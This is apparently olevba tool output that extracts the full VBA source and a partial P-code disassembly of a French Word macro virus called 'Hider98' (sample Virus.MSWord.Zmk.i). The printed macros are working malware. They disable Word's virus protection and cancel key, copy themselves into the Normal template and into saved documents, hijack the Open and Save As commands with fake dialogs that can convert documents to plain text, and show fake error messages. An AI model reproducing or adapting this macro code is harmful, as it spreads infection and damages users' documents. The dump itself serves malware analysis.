olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hider98.bas 
in file: Virus.MSWord.Zmk.i - OLE stream: 'Macros/VBA/Hider98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "Hider98" Then
        Hider98Installed = -1
    End If
Next i
If Not Hider98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Hider98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="FileOp", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="FileSA", Object:=wdOrganizerObjectProjectItems
    MsgBox "Une surprise vous attend...", vbCritical, "Virus Hider98"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Hider98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileOp", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSA", Object:=wdOrganizerObjectProjectItems
End If
ErrorAO:
End Sub
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFO
Dim MyDate
Randomize
MyDate = Date
D$ = Mid(MyDate, 1, 2)
NHD$ = Int(Rnd * 31) + 1
If NHD$ = "1" Then NHD$ = "01"
If NHD$ = "2" Then NHD$ = "02"
If NHD$ = "3" Then NHD$ = "03"
If NHD$ = "4" Then NHD$ = "04"
If NHD$ = "5" Then NHD$ = "05"
If NHD$ = "6" Then NHD$ = "06"
If NHD$ = "7" Then NHD$ = "07"
If NHD$ = "8" Then NHD$ = "08"
If NHD$ = "9" Then NHD$ = "09"
If D$ = NHD$ Then
    FileOp.Show
    MsgBox "ZeMacroKiller98 est heureux de vous dédier ce nouveau virus.", vbInformation, "Virus Hider98"
Else
    Dialogs(wdDialogFileOpen).Show
End If
ErrorFO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
Dim MyDate, Valeur$
Randomize
MyDate = Date
D$ = Mid(MyDate, 1, 2)
NHD$ = Int(Rnd * 31) + 1
If NHD$ = "1" Then NHD$ = "01"
If NHD$ = "2" Then NHD$ = "02"
If NHD$ = "3" Then NHD$ = "03"
If NHD$ = "4" Then NHD$ = "04"
If NHD$ = "5" Then NHD$ = "05"
If NHD$ = "6" Then NHD$ = "06"
If NHD$ = "7" Then NHD$ = "07"
If NHD$ = "8" Then NHD$ = "08"
If NHD$ = "9" Then NHD$ = "09"
If D$ = NHD$ Then
Debut:
    FileSA.Show
    Valeur$ = WordBasic.[GetPrivateProfileString$]("FileSA", "Choix", "WIN.INI")
    If Valeur$ <> "1" Then
        GoTo Debut
    End If
Else
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Hider98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileOp", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSA", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    With Dialogs(wdDialogFileSummaryInfo)
        .Subject = "Virus Hider98 par ZeMacroKiller98"
        .Execute
    End With
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Erreur dans le fichier User32.dll", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVBCode
    MsgBox "Ce programme a réalisé une opération illégale et va être interompu", vbCritical, "Microsoft Word"
ErrorVBCode:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOp.frm 
in file: Virus.MSWord.Zmk.i - OLE stream: 'Macros/VBA/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton2_Click()
Unload FileOp
End Sub

Private Sub CommandButton3_Click()
MsgBox "Menu inaccessible pour l'instant", vbCritical, "Microsoft Word"
End Sub

Private Sub CommandButton4_Click()
MsgBox "Recherche impossible, veuillez réessayer plus tard!!!!", vbCritical, "Microsoft Word"
End Sub

Private Sub CommandButton5_Click()
MsgBox "Nouvelle recherche impossible", vbCritical, "Microsoft Word"
End Sub

Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ComboBox1.Text = CurDir
ComboBox3.AddItem "Tous les fichiers"
ComboBox3.AddItem "Documents Word"
ComboBox3.AddItem "Modèles de document"
ComboBox3.AddItem "RTF"
ComboBox3.AddItem "Fichier texte"
ComboBox3.AddItem "Fichier de texte unicode"
ComboBox3.AddItem "Liste de contacts Schedule+"
ComboBox3.AddItem "Carnet d'adresses personnels"
ComboBox3.AddItem "Carnet d'adresses Outlook"
ComboBox3.AddItem "Texte avec mise en page(MS-DOS)"
ComboBox3.AddItem "Texte avec mise en forme"
ComboBox3.AddItem "HTML Document"
ComboBox3.AddItem "Word(versions orientales)6.0/5"
ComboBox3.AddItem "Word 4.0-5.1 pour macintosh"
ComboBox3.AddItem "WordPerfect 5.x"
ComboBox3.AddItem "WordPerfect 6.x"
ComboBox3.AddItem "Feuille de calcul Microsoft Excel"
ComboBox3.AddItem "Lotus 1-2-3"
ComboBox3.AddItem "Works pour Windows 3.0"
ComboBox3.AddItem "Works 4.0 pour Windows"
ComboBox3.AddItem "Récupération de texte"
ComboBox3.AddItem "Windows Write"
ComboBox3.AddItem "Word pour MS-DOS 3.x-5.x"
ComboBox3.AddItem "Word pour MS-DOS 6.0"
ComboBox5.AddItem "aujourd'hui"
ComboBox5.AddItem "la semaine dernière"
ComboBox5.AddItem "Cette semaine"
ComboBox5.AddItem "le mois dernier"
ComboBox5.AddItem "ce mois-ci"
ComboBox5.AddItem "n'importe quand"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSA.frm 
in file: Virus.MSWord.Zmk.i - OLE stream: 'Macros/VBA/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
If ComboBox2.Value = "" Then
    MsgBox "Veuillez entrer un nom", vbInformation, "Microsoft Word"
Else
    ActiveDocument.SaveAs FileName:=ComboBox2.Value, FileFormat:=wdFormatText
End If
WordBasic.SetPrivateProfileString "FileSA", "Choix", 1, "WIN.INI"
MsgBox "HAHAHAHAHA!!!!", vbInformation, "Virus Hider98"
End Sub

Private Sub CommandButton2_Click()
WordBasic.SetPrivateProfileString "FileSA", "Choix", 0, "WIN.INI"
End Sub

Private Sub CommandButton3_Click()
MsgBox "Impossible d'acceder à ce menu", vbCritical, "Microsoft Word"
WordBasic.SetPrivateProfileString "FileSA", "Choix", 0, "WIN.INI"
End Sub

Private Sub CommandButton4_Click()
MsgBox "Pas assez de mémoire", vbCritical, "Microsoft Word"
WordBasic.SetPrivateProfileString "FileSA", "Choix", 0, "WIN.INI"
End Sub

Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ComboBox1.Text = CurDir
ComboBox3.Text = "Document Word"
ComboBox3.AddItem "Documents Word"
ComboBox3.AddItem "Modèle de document"
ComboBox3.AddItem "Texte seulement"
ComboBox3.AddItem "Texte seulement avec sauts de ligne"
ComboBox3.AddItem "Texte MS-DOS"
ComboBox3.AddItem "Texte MS-DOS avec sauts de ligne"
ComboBox3.AddItem "Texte mis en forme(RTF)"
ComboBox3.AddItem "Texte unicode"
ComboBox3.AddItem "Texte avec mise en page(MS-DOS)"
ComboBox3.AddItem "Texte avec mise en forme"
ComboBox3.AddItem "HTML Document"
ComboBox3.AddItem "Word 2.x for Windows"
ComboBox3.AddItem "Word 4.0 pour Macintosh"
ComboBox3.AddItem "Word 5.0 pour Macintosh"
ComboBox3.AddItem "Word 5.1 pour Macintosh"
ComboBox3.AddItem "WordPerfect 5.0"
ComboBox3.AddItem "WordPerfect 5.1 pour DOS"
ComboBox3.AddItem "WordPerfect 5.x pour Windows"
ComboBox3.AddItem "Fichier secondaire pour WordPerfect 5.1 ou 5.2"
ComboBox3.AddItem "Fichier secondaire pour WordPerfect 5.0"
ComboBox3.AddItem "Works pour Windows 3.0"
ComboBox3.AddItem "Works 4.0 pour Windows"
ComboBox3.AddItem "Word 6.0/95"
ComboBox3.AddItem "Word for Windows (generic)"
ComboBox3.AddItem "Windows Write 3.0"
ComboBox3.AddItem "Word for MS-DOS 3.x-5.x"
ComboBox3.AddItem "Word for MS-DOS 6.0"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1192 bytes
' Macros/VBA/Hider98 - 13292 bytes
' Line #0:
' 	FuncDefn (Sub ErrorAO())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError iMacroCount 
' Line #6:
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	MemLd i 
' 	St _B_var_iMacroCount 
' Line #7:
' 	StartForVariable 
' 	Ld _B_var_i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld _B_var_iMacroCount 
' 	For 
' Line #8:
' 	Ld _B_var_i 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Count 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Hider98"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	UMi 
' 	St _B_var_Hider98Installed 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld _B_var_i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld _B_var_Hider98Installed 
' 	Not 
' 	IfBlock 
' Line #13:
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0007 "Hider98"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #14:
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0006 "FileOp"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #15:
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0006 "FileSA"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #16:
' 	LitStr 0x001B "Une surprise vous attend..."
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus Hider98"
' 	ArgsCall MsgBox 0x0003 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0007 "Hider98"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #19:
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0006 "FileOp"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #20:
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0006 "FileSA"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Label iMacroCount 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub FileOpen())
' Line #25:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #26:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	OnError ErrorFO 
' Line #30:
' 	Dim 
' 	VarDefn D
' Line #31:
' 	ArgsCall Read 0x0000 
' Line #32:
' 	Ld Date 
' 	St D 
' Line #33:
' 	Ld D 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St _B_str_D$ 
' Line #34:
' 	Ld Dialogs 
' 	LitDI2 0x001F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St _B_str_NHD$ 
' Line #35:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "01"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #36:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "02"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #37:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "03"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #38:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "04"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #39:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "05"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #40:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "06"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #41:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "07"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #42:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "08"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #43:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "09"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #44:
' 	Ld _B_str_D$ 
' 	Ld _B_str_NHD$ 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld FileOp 
' 	ArgsMemCall Show 0x0000 
' Line #46:
' 	LitStr 0x003C "ZeMacroKiller98 est heureux de vous dédier ce nouveau virus."
' 	Ld wdFormatText 
' 	LitStr 0x000D "Virus Hider98"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	ElseBlock 
' Line #48:
' 	Ld CommandButton5_Click 
' 	ArgsLd wdDialogFileOpen 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Label ErrorFO 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub ErrorFSA())
' Line #53:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #54:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #57:
' 	OnError AutoOpen 
' Line #58:
' 	Dim 
' 	VarDefn D
' 	VarDefn SetPrivateProfileSting
' Line #59:
' 	ArgsCall Read 0x0000 
' Line #60:
' 	Ld Date 
' 	St D 
' Line #61:
' 	Ld D 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St _B_str_D$ 
' Line #62:
' 	Ld Dialogs 
' 	LitDI2 0x001F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St _B_str_NHD$ 
' Line #63:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "01"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #64:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "02"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #65:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "03"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #66:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "04"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #67:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "05"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #68:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "06"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #69:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "07"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #70:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "08"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #71:
' 	Ld _B_str_NHD$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "09"
' 	St _B_str_NHD$ 
' 	EndIf 
' Line #72:
' 	Ld _B_str_D$ 
' 	Ld _B_str_NHD$ 
' 	Eq 
' 	IfBlock 
' Line #73:
' 	Label GetPrivateProfileString$ 
' Line #74:
' 	Ld FileSA 
' 	ArgsMemCall Show 0x0000 
' Line #75:
' 	LitStr 0x0006 "FileSA"
' 	LitStr 0x0005 "Choix"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [msgbo] 0x0003 
' 	St SetPrivateProfileSting$ 
' Line #76:
' 	Ld SetPrivateProfileSting$ 
' 	LitStr 0x0001 "1"
' 	Ne 
' 	IfBlock 
' Line #77:
' 	GoTo GetPrivateProfileString$ 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	ElseBlock 
' Line #80:
' 	Ld SaveFormat 
' 	ArgsLd wdDialogFileOpen 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #81:
' 	Ld FullName 
' 	MemLd wdFormatDocument 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Ld FullName 
' 	MemLd wdFormatDocument 
' 	Ld SaveAs 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #82:
' 	Ld SaveAs 
' 	ParamNamed Save 
' 	Ld FullName 
' 	ArgsMemCall FileFormat 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0007 "Hider98"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #85:
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0006 "FileOp"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #86:
' 	Ld VBProject 
' 	MemLd Destination 
' 	ParamNamed ActiveDocument 
' 	Ld FullName 
' 	MemLd Destination 
' 	ParamNamed estination 
' 	LitStr 0x0006 "FileSA"
' 	ParamNamed New 
' 	Ld MyDate 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0004 
' Line #87:
' 	Ld FullName 
' 	ArgsMemCall CommandButton1_Click 0x0000 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Label AutoOpen 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ErrorFT())
' Line #92:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #93:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #95:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #96:
' 	OnError wdDialogFileSummaryInfo 
' Line #97:
' 	StartWithExpr 
' 	Ld _B_var_With 
' 	ArgsLd wdDialogFileOpen 0x0001 
' 	With 
' Line #98:
' 	LitStr 0x0021 "Virus Hider98 par ZeMacroKiller98"
' 	MemStWith Execute 
' Line #99:
' 	ArgsMemCallWith ToolsMacro 0x0000 
' Line #100:
' 	EndWith 
' Line #101:
' 	Label wdDialogFileSummaryInfo 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub errot())
' Line #104:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #105:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #106:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #107:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #108:
' 	OnError id_0320 
' Line #109:
' 	LitStr 0x0021 "Erreur dans le fichier User32.dll"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #110:
' 	Label id_0320 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub eror())
' Line #113:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #114:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #116:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #117:
' 	OnError Valeur 
' Line #118:
' 	LitStr 0x0042 "Ce programme a réalisé une opération illégale et va être interompu"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #119:
' 	Label Valeur 
' Line #120:
' 	EndSub 
' Macros/VBA/FileOp - 10251 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #1:
' 	Ld FileOp 
' 	ArgsCall Unlock 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #5:
' 	LitStr 0x0020 "Menu inaccessible pour l'instant"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #9:
' 	LitStr 0x0036 "Recherche impossible, veuillez réessayer plus tard!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	EndSub 
' Line #11:
' Line #12:
' 	FuncDefn (Private Sub _B_var_Date())
' Line #13:
' 	LitStr 0x001D "Nouvelle recherche impossible"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	Ld CurDir 
' 	Ld ComboBox1 
' 	MemSt Then 
' Line #22:
' 	LitStr 0x0011 "Tous les fichiers"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #23:
' 	LitStr 0x000E "Documents Word"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #24:
' 	LitStr 0x0013 "Modèles de document"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #25:
' 	LitStr 0x0003 "RTF"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #26:
' 	LitStr 0x000D "Fichier texte"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #27:
' 	LitStr 0x0018 "Fichier de texte unicode"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #28:
' 	LitStr 0x001B "Liste de contacts Schedule+"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #29:
' 	LitStr 0x001C "Carnet d'adresses personnels"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #30:
' 	LitStr 0x0019 "Carnet d'adresses Outlook"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #31:
' 	LitStr 0x001F "Texte avec mise en page(MS-DOS)"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #32:
' 	LitStr 0x0018 "Texte avec mise en forme"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #33:
' 	LitStr 0x000D "HTML Document"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #34:
' 	LitStr 0x001E "Word(versions orientales)6.0/5"
' 	Ld ComboBox3 
' 	ArgsMemCall AddItem 0x0001 
' Line #35:
